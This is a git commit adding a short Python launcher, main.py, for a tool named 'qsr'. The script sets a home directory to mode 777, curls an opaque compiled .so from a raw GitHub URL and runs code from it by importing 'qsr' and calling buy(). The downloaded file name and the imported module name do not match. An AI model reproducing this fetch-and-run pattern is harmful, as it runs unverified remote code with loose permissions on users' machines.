ba183c5e8823b3a75bbe70eac1009b2217b4b7b5
Qaiser Abbas <69212320+TechQaiser@users.noreply.github.com>
2023-02-12 17:20:51 +0500

    Create main.py

---
+++ main.py
@@ -0,0 +1,33 @@
+import re,os,sys
+
+try:
+
+    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
+
+    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
+
+        os.system("chmod 777 $HOME/Qsr")
+
+        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
+
+        import qsr
+
+        qsr.buy()
+
+    else:
+
+        import qsr
+
+        qsr.buy()
+
+except PermissionError:
+
+    exit('Permission Error ! Found')
+
+except ConnectionError:
+
+    exit('Network Error ! Found')
+
+except Exception as e:
+
+    print(e)
